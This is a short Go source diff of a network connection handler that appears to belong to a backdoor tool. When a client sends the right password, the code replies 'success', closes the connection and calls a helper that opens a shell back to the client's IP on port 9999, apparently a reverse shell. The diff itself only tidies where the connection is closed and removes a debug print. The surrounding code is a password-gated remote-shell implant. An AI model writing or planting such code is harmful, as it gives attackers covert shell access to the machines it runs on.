@@ -17,11 +17,10 @@ func HandleConnection(c net.Conn) {
 			fmt.Println(err)
 			return
 		}
-
 		temp := strings.TrimSpace(string(netData))
-		println(temp)
 		if temp == helpers.Password {
 			c.Write([]byte(string("success")))
+			c.Close()
 			println(strings.Split(c.RemoteAddr().String(), ":")[0] + ":9999")
 			helpers.Shell(strings.Split(c.RemoteAddr().String(), ":")[0] + ":9999")
 			break
@@ -29,6 +28,6 @@ func HandleConnection(c net.Conn) {
 			c.Write([]byte(string("error")))
 			break
 		}
+
 	}
-	c.Close()
 }
